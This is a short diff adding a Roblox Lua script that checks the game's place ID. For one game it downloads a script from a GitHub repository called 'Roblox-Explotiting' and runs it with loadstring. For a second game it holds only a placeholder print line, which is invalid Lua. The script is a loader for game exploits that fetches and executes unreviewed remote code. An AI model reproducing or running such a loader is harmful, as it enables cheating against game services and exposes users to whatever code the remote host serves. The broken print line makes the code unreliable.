@@ -1,0 +1,6 @@
+if game.PlaceId == 537413528 then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KitMaksym/Roblox-Explotiting/main/babft"))()
+end
+if game.PlaceId == 9476339275 then
+print(making for this game)
+end
